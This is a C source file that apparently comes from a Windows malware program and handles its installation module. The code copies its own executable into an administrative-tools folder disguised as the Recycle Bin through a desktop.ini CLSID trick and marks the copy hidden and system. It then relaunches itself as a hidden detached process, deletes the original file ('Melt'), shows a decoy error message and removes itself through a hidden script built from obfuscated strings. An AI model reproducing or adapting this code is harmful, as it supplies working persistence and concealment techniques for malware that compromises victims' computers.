#include "stuff.h"
#include "externals.h"

//#define		s_GUID  "871C5380-42A0-1069-A2EA-08002B30309D" // IE icon
//#define		s_GUID	"21EC2020-3AEA-1069-A2DD-08002B30309D" // control panel

BOOL StartClone(char *me, char *target, char *path)
{
	char	commandline[512];
	BOOL	success;

	_snprintf(commandline, sizeof(commandline) - 1, "%s %s", target, me);

	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef DEBUG
	sinfo.wShowWindow = SW_SHOW;
#else
	sinfo.wShowWindow = SW_HIDE;
#endif

#ifdef DEBUG
	success = fCreateProcess(NULL, commandline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL, path, &sinfo, &pinfo);
#else
	success = fCreateProcess(NULL, commandline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, path, &sinfo, &pinfo);
#endif

	return success;
}


#ifndef NO_INSTALL

BOOL CreateDir(char *path)
{
	if (!fCreateDirectory(path, NULL) && fGetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;

	fSetFileAttributes(path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	return TRUE;
}


BOOL CreateDesktopini(char *dir)
{
	FILE	*f;
	char	data[MAX_PATH];

	_snprintf(data, sizeof(data) - 1, "%s\\%s", dir, strings[Decode(s_Desktopini)].encoded);

	// if theres another file, delete it first
	fSetFileAttributes(data, FILE_ATTRIBUTE_NORMAL);
	fDeleteFile(data);

	f = fopen(data, "wb");
	if (f == NULL)
		return FALSE;

	_snprintf(data, sizeof(data) - 1, "%s\nCLSID={%s}", strings[Decode(s_Desktopinidata)].encoded, strings[Decode(s_GUID)].encoded);

	fwrite(data, strlen(data), 1, f);
	fclose(f);

	return TRUE;
}


BOOL CopyMe(char *dir, char *destfname)
{
	char	temp[MAX_PATH];
	FILE	*rf, *wf;
	char	*c;

	fGetModuleFileName(0, temp, sizeof(temp));

	rf = fopen(temp, "rb");
	if (rf == NULL)
		return FALSE;

	_snprintf(temp, sizeof(temp) - 1, "%s\\%s", dir, destfname); 

	// if theres another file, delete it first
	fSetFileAttributes(temp, FILE_ATTRIBUTE_NORMAL);
	fDeleteFile(temp);

	wf = fopen(temp, "wb");

	if (wf == NULL)
		return FALSE;

	c = (char *) malloc (1);
	while (fread(c, 1, 1, rf) == 1)
	{
		if (fwrite(c, 1, 1, wf) != 1)
			return TRUE;
	}

	free(c);

	fclose(rf);
	fclose(wf);

	fSetFileAttributes(temp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	return TRUE;
}


void InstallMe(char *filename)
{
	char	temp[MAX_PATH], path[MAX_PATH], fullpath[MAX_PATH];

	if (!SUCCEEDED(fSHGetFolderPath(NULL, CSIDL_COMMON_ADMINTOOLS|CSIDL_FLAG_CREATE, NULL, 0, temp)))
		return;

	_snprintf(path, sizeof(path) - 1, "%s\\%s", temp, strings[Decode(s_RecycleBin)].encoded);

	// check if we are already installed
	fGetModuleFileName(0, temp, sizeof(temp));
#ifdef DEBUG
	printf("Current file module location: %s\n", temp);
#endif
	_snprintf(fullpath, sizeof(fullpath) - 1, "%s\\%s", path, filename);
#ifdef DEBUG
	printf("Installing into: %s\n", fullpath);
#endif

	if (!strcmp(temp, fullpath))
	{
#ifdef DEBUG
		printf("Already installed.\n");
#endif
		// we are already running from that location - do not install
		return;
	}
	else
	{
		if (CreateDir(path))
		{
	#ifdef DEBUG
			printf("Directory created. ");
	#endif
		}
		else
			return;
		if (CreateDesktopini(path))
		{
	#ifdef DEBUG
			printf("Desktop.ini created. ");
	#endif
		}
		else
			return;
		if (CopyMe(path, filename))
		{
	#ifdef DEBUG
			printf("File copied.\n");
	#endif
		}
		else
			return;
	}

	// run copied file
	if (StartClone(temp, fullpath, path))
		ExitProcess(0);
}


void Melt(char **cmdline, int params, char *errormessage)
{
	int			i;
	char		file[MAX_PATH] = {0};

	if (!strcmp(cmdline[1], "cl"))
		return;

	for (i = 1; i < params; i++)
		_snprintf(file, sizeof(file) - 1, "%s %s", file, cmdline[i]);

	if (file[0] == '\x20')
		memmove(file, file + 1, sizeof(file) - 1);

#ifdef DEBUG
	printf("Original file location: %s\nNow trying to delete...", file);
#endif

	for (i = 0; i < 10; i++)
	{
		if (fDeleteFile(file))
		{
#ifdef DEBUG
			printf("Success\n");
#endif

#ifndef NO_MSGBOX
			InjectMessageBox(errormessage);
#endif
			return;
		}
		else
			Sleep(500);
	}

#ifdef DEBUG
	printf("Failed\n");
#endif

#ifndef NO_MSGBOX
	InjectMessageBox(errormessage);
#endif
}

void UninstallMe(char *filename)
{
	// todo: folder cleanup aswell
	FILE	*f;
	char	data[512];
	char	fname[MAX_PATH];

	_snprintf(fname, sizeof(fname) - 1, "%s", strings[Decode(s_removefile)].encoded);
	_snprintf(data, sizeof(data) - 1,	"%s\n"
										"%s\n"
										"%s\n"
										"%s\n"
										"%s\n"
										"%s",
										strings[Decode(s_removeline1)].encoded,
										strings[Decode(s_removeline2)].encoded,
										strings[Decode(s_removeline3)].encoded,
										strings[Decode(s_removeline4)].encoded,
										strings[Decode(s_removeline5)].encoded,
										strings[Decode(s_removeline6)].encoded);

	f = fopen(fname, "wb");
	if (f == NULL)
		return;

	fputs(data, f);
	fclose(f);

	fSetFileAttributes(filename, FILE_ATTRIBUTE_NORMAL);

	// todo: vista compatibility
	fShellExecute(NULL, NULL, fname, filename, NULL, SW_HIDE);
}

#endif